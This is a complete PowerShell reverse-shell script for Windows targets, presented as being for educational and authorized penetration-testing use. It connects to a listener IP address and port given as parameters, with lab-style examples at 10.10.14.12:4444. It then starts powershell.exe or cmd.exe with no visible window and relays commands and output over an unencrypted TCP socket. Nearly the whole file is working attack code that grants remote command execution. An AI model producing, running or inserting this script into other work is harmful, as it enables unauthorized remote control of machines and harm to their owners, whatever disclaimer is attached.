<#
.SYNOPSIS
    A modern, robust reverse shell for Windows targets, written in PowerShell.
.DESCRIPTION
    This script connects back to a listening server and provides an interactive shell 
    (PowerShell or cmd.exe). It is intended for educational and authorized penetration 
    testing purposes only. All communication is unencrypted.
.PARAMETER IPAddress
    The IP address of the listening machine (required).
.PARAMETER Port
    The port on the listening machine (required).
.PARAMETER Shell
    The shell to execute on the target. Defaults to 'powershell.exe'. 
    Can be changed to 'cmd.exe'.
.EXAMPLE
    # Connect back to 10.10.14.12 on port 4444 with a PowerShell prompt
    .\reverse_shell.ps1 -IPAddress 10.10.14.12 -Port 4444

.EXAMPLE
    # Connect back with a classic Command Prompt (cmd.exe)
    .\reverse_shell.ps1 -IPAddress 10.10.14.12 -Port 4444 -Shell cmd.exe
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, HelpMessage = "The IP address of the listener.")]
    [string]$IPAddress,

    [Parameter(Mandatory = $true, HelpMessage = "The port on the listener.")]
    [int]$Port,

    [Parameter(Mandatory = $false, HelpMessage = "The shell to spawn ('powershell.exe' or 'cmd.exe').")]
    [ValidateSet('powershell.exe', 'cmd.exe')]
    [string]$Shell = "powershell.exe"
)

# Suppress error messages for a cleaner shell experience
$ErrorActionPreference = "SilentlyContinue"

# Main execution wrapped in a try/finally to ensure cleanup
try {
    Write-Host "[*] Attempting to connect to $IPAddress on port $Port..."

    # 1. Establish the TCP Connection
    $client = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)
    if (-not $client.Connected) {
        throw "Failed to connect to the listener."
    }
    Write-Host "[+] Connection established successfully." -ForegroundColor Green
    $stream = $client.GetStream()

    # 2. Spawn the Shell Process
    Write-Host "[*] Spawning shell process: $Shell"
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = $Shell
    $process.StartInfo.RedirectStandardInput = $true
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.RedirectStandardError = $true
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.CreateNoWindow = $true # Run hidden in the background
    $process.Start()

    # Get stream objects for interacting with the shell
    $inputStream = $process.StandardInput
    $outputStream = $process.StandardOutput
    $errorStream = $process.StandardError

    # 3. Main Event Loop to Proxy Data
    Write-Host "[*] Entering interactive shell mode. Use 'exit' to close the shell."

    # Setup buffers and encoding
    $buffer = New-Object Byte[] 8192 # 8KB buffer
    $encoding = [System.Text.Encoding]::ASCII

    while ($client.Connected -and $process.HasExited -eq $false) {
        # Check for data from the listener -> send to shell
        if ($stream.DataAvailable) {
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -gt 0) {
                $command = $encoding.GetString($buffer, 0, $bytesRead)
                $inputStream.WriteLine($command)
                $inputStream.Flush()
            }
        }

        # Check for data from the shell's stdout -> send to listener
        # Peek() returns -1 if there is nothing to read, avoiding a block
        if ($outputStream.Peek() -ne -1) {
            $output = $outputStream.ReadToEnd()
            $stream.Write($encoding.GetBytes($output), 0, $output.Length)
            $stream.Flush()
        }

        # Check for data from the shell's stderr -> send to listener
        if ($errorStream.Peek() -ne -1) {
            $errorOutput = $errorStream.ReadToEnd()
            $stream.Write($encoding.GetBytes($errorOutput), 0, $errorOutput.Length)
            $stream.Flush()
        }

        # Pause briefly to prevent 100% CPU usage in an idle loop
        Start-Sleep -Milliseconds 100
    }
}
catch {
    Write-Error "[!] An error occurred: $_"
}
finally {
    # 4. Cleanup Resources
    Write-Host "`n[*] Cleaning up and exiting."
    if ($process -and -not $process.HasExited) {
        $process.Kill()
    }
    if ($client) {
        $client.Close()
    }
}
